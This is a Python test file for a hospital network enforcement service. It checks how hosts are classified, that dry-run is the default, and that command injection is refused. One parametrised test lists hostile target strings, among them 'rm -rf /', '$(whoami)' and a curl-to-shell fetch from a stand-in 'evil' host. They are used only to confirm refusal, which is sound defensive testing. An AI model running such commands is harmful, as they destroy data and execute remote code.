"""Who gets acted on — the decision that can hurt a patient if it is wrong.

Our first version of this quarantined "the device the alert was about". For a
man-in-the-middle that is the victim: it does not stop the attacker, it takes the
patient off the central station, and it leaves the attacker on the network. The
second version then picked the *other* end by direction, which on a compromised
device pointed at the HIS — blocking the hospital's information system.

Both mistakes are cheap to make again during a refactor and expensive to notice
in production, so the classification is pinned here rather than trusted.
"""

import pytest

from services.enforcement.command import SAFE_TARGET, CommandActuator
from services.enforcement_service import DEVICE, INFRASTRUCTURE, UNKNOWN, classify


class FakeDevice:
    def __init__(self, uid):
        self.device_uid = uid


DEVICES = {"192.168.20.11": FakeDevice("MON-ICU1-001")}
PROTECTED = {"192.168.20.5", "192.168.20.1"}


# --- who is who ----------------------------------------------------------


@pytest.mark.parametrize("ip, expected", [
    ("192.168.20.11", DEVICE),           # a registered monitor
    ("192.168.20.5", INFRASTRUCTURE),    # the HIS
    ("192.168.20.1", INFRASTRUCTURE),    # the gateway
    ("192.168.20.199", UNKNOWN),         # nobody vouched for this
    ("203.0.113.77", UNKNOWN),
    (None, UNKNOWN),
])
def test_hosts_are_classified_by_the_registry_not_by_direction(ip, expected):
    assert classify(ip, DEVICES, PROTECTED) == expected


def test_the_his_is_not_a_medical_device_but_is_still_protected():
    """Blocking the HIS stops every ward charting — a bigger incident than most alerts."""
    assert classify("192.168.20.5", DEVICES, PROTECTED) == INFRASTRUCTURE
    assert classify("192.168.20.5", DEVICES, PROTECTED) != UNKNOWN


def test_an_unregistered_host_is_the_only_freely_actionable_one():
    actionable = [ip for ip in ["192.168.20.11", "192.168.20.5", "192.168.20.199"]
                  if classify(ip, DEVICES, PROTECTED) == UNKNOWN]
    assert actionable == ["192.168.20.199"]


# --- a target from the network never reaches a shell ---------------------


@pytest.mark.parametrize("target", [
    "10.0.0.1; rm -rf /",
    "$(whoami)",
    "`id`",
    "10.0.0.1 && curl http://evil/x | sh",
    "10.0.0.1\nsecond-command",
    "--flag",
    "a" * 100,
])
def test_a_hostile_target_is_refused_before_the_command_is_built(target):
    """Targets are IPs and MACs observed in packets. They are attacker-controlled."""
    actuator = CommandActuator({"template": "echo {target}"}, dry_run=False)
    result = actuator.execute(target=target, reason="test")
    assert not result.succeeded
    assert "refusing" in result.detail or "ValueError" in result.detail


@pytest.mark.parametrize("target", ["192.168.20.199", "84:3a:4b:0f:5b:94", "Gi1/0/14", "10.0.0.0/24"])
def test_a_legitimate_target_is_accepted(target):
    assert SAFE_TARGET.match(target)


def test_the_template_is_split_before_substitution():
    """Substituting first would let a target with a space become extra arguments."""
    actuator = CommandActuator({"template": "block {target} now"}, dry_run=False)
    # A space fails SAFE_TARGET, so it never even reaches the split — belt and braces.
    assert not SAFE_TARGET.match("10.0.0.1 --force")
    assert actuator._render("10.0.0.1") == ["block", "10.0.0.1", "now"]


def test_an_unfilled_placeholder_is_an_error_not_a_literal():
    actuator = CommandActuator({"template": "ssh {switch} shut {target}"}, dry_run=False)
    with pytest.raises(ValueError, match="unfilled"):
        actuator._render("10.0.0.1")


# --- enforcement is off until someone turns it on ------------------------


def test_an_actuator_is_dry_run_unless_told_otherwise():
    assert CommandActuator({"template": "echo {target}"}).dry_run is True


def test_an_unconfigured_actuator_reports_itself_rather_than_pretending():
    actuator = CommandActuator({}, dry_run=False)
    ready, why = actuator.available()
    assert not ready and "template" in why

    result = actuator.execute(target="10.0.0.1", reason="test")
    assert not result.succeeded, "an unavailable actuator must not report success"


def test_a_dry_run_never_executes():
    """The description must be produced without the command running."""
    actuator = CommandActuator({"template": "python -c exit(1)"}, dry_run=True)
    result = actuator.execute(target="10.0.0.1", reason="test")
    assert result.dry_run and result.succeeded
    assert str(result).startswith("would ")
